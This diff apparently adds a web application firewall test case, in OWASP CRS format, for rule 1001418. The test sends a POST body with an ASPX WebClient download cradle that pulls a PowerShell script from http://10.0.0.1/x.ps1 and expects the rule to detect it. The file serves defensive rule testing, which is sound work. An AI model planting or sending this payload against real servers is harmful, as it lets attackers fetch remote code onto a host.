@@ -1,0 +1,23 @@
+---
+meta:
+  author: "JiuZhang Security Team"
+  description: "ASPX WebClient download cradle"
+rule_id: 1001418
+tests:
+  - test_id: 1
+    desc: "ASPX WebClient download cradle"
+    stages:
+      - input:
+          dest_addr: 127.0.0.1
+          headers:
+            Host: localhost
+            User-Agent: "OWASP CRS test agent"
+            Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+          method: POST
+          port: 80
+          uri: "/post"
+          data: 'file=<% var wc = new System.Net.WebClient(); string s = wc.DownloadString("http://10.0.0.1/x.ps1"); %>'
+          version: HTTP/1.1
+        output:
+          log:
+            expect_ids: [1001418]
